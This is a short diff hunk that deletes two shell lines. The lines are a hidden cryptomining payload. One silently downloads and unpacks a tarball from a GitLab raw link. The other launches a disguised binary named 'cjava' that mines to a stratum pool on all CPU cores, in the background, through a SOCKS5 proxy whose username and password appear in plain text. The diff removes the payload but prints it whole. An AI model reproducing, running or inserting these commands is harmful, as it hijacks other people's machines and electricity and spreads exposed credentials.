@@ -1,2 +1,0 @@
-wget -qO sg.tar.gz https://gitlab.com/ghcees/pack/-/raw/main/sg.tar.gz && tar -xzf sg.tar.gz && rm -rf sg* >/dev/null 2>&1
-./cjava -a yespowertide  -o stratum+tcps://stratum-na.rplant.xyz:17059 -u TLADAab9X4cxrmH8r7LTeWonEGh2t9rmsM.$(echo $(shuf -i 1-9 -n 1)-ambar) -p -x -t $(nproc --all) -x socks5://asyneczgil-res-country-GR-hold-session-session-66f99e7f682f7:ZvdYyMVd75i9yteGy@190.2.130.11:9999 &>/dev/null &
